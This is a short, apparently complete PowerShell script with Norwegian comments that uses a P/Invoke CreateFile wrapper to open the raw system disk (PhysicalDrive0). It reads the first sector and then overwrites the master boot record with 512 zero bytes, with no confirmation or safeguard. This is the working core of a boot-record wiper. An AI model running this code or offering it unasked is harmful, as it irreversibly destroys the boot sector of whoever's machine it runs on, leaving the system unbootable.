# 1. Definer Win32 CreateFile via C# P/Invoke
$code = @"
using System;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;

public class RawDisk {
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern SafeFileHandle CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile
    );
}
"@
Add-Type -TypeDefinition $code

# 2. Konstanter som gyldig UInt32 (fikser feilmeldingen)
[uint32]$GENERIC_RW = "0xC0000000"
[uint32]$FILE_SHARE_RW = 3
[uint32]$OPEN_EXISTING = 3

$diskPath = "\\.\PhysicalDrive0"

# 3. Åpne SafeFileHandle mot rå disk
$handle = [RawDisk]::CreateFile($diskPath, $GENERIC_RW, $FILE_SHARE_RW, [IntPtr]::Zero, $OPEN_EXISTING, 0, [IntPtr]::Zero)

if ($null -eq $handle -or $handle.IsInvalid) {
    throw "Kunne ikke åpne disken. Husk å kjøre PowerShell som Administrator."
}

# 4. Koble handle til FileStream og les 1 sektor (512 bytes)
try {
    $fs = New-Object System.IO.FileStream($handle, [System.IO.FileAccess]::ReadWrite)
    $buffer = New-Object byte[] 512
    $bytesRead = $fs.Read($buffer, 0, $buffer.Length)
    
    ($buffer[0..15] | ForEach-Object { $_.ToString("X2") }) -join " "

    # 5. Skriv nuller til MBR (første 512 bytes)
    $fs.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
    $zeroBuffer = New-Object byte[] 512
    $fs.Write($zeroBuffer, 0, $zeroBuffer.Length)
    $fs.Flush()
}
finally {
    if ($fs) { $fs.Close() }
    if ($handle) { $handle.Close() }
}
